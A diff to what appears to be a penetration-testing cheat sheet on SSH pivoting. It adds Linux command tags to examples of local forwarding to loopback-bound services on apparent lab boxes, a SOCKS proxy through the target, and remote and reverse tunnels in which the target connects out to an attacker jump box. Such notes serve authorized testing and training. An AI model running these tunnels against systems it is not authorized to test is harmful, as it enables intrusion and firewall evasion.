@@ -12,6 +12,7 @@ Services often bind to `127.0.0.1` and are unreachable from the attacker box. On
 
 ## Local Forwarding (most common)
 
+<!-- cmd: linux -->
 ```bash
 ssh -L <LOCAL_PORT>:<REMOTE_HOST>:<REMOTE_PORT> user@target
 ```
@@ -19,12 +20,14 @@ ssh -L <LOCAL_PORT>:<REMOTE_HOST>:<REMOTE_PORT> user@target
 `<REMOTE_HOST>` is resolved **from the target's perspective** — use `127.0.0.1` to reach services bound to loopback on the target itself, or internal hostnames to reach other machines.
 
 ### Silentium — Gogs on 127.0.0.1:3001
+<!-- cmd: linux -->
 ```bash
 ssh -L 8080:127.0.0.1:3001 ben@TARGET_IP
 ```
 Now `http://127.0.0.1:8080` on the attacker → Gogs web UI on the target.
 
 ### CCTV — motionEye on 127.0.0.1:7999
+<!-- cmd: linux -->
 ```bash
 ssh -L 8765:127.0.0.1:7999 sa_mark@TARGET_IP
 ```
@@ -32,11 +35,13 @@ ssh -L 8765:127.0.0.1:7999 sa_mark@TARGET_IP
 ## Dynamic Forwarding (SOCKS proxy)
 
 When you need to browse many internal hosts:
+<!-- cmd: linux -->
 ```bash
 ssh -D 1080 user@target
 ```
 Point a tool (`proxychains`, Firefox, curl `--socks5`) at `127.0.0.1:1080` and every request is egressed from the target.
 
+<!-- cmd: linux -->
 ```bash
 proxychains curl http://internal.service:8500/status
 ```
@@ -44,6 +49,7 @@ proxychains curl http://internal.service:8500/status
 ## Remote Forwarding (target → attacker)
 
 Useful when an inbound firewall blocks you but the target can egress:
+<!-- cmd: linux -->
 ```bash
 ssh -R 9001:localhost:4444 user@jump-box
 # attacker listens on jump-box:9001
@@ -52,6 +58,7 @@ ssh -R 9001:localhost:4444 user@jump-box
 ## Reverse SSH (target initiates)
 
 Same concept, but the target connects outward to your jump box:
+<!-- cmd: linux -->
 ```bash
 # from target
 ssh -R 2222:localhost:22 attacker@jump
@@ -71,6 +78,7 @@ ssh -p 2222 user@localhost
 
 ## Typical Full Command
 
+<!-- cmd: linux -->
 ```bash
 ssh -fNL 8080:127.0.0.1:3001 -i /tmp/key ben@target -o ServerAliveInterval=30
 ```
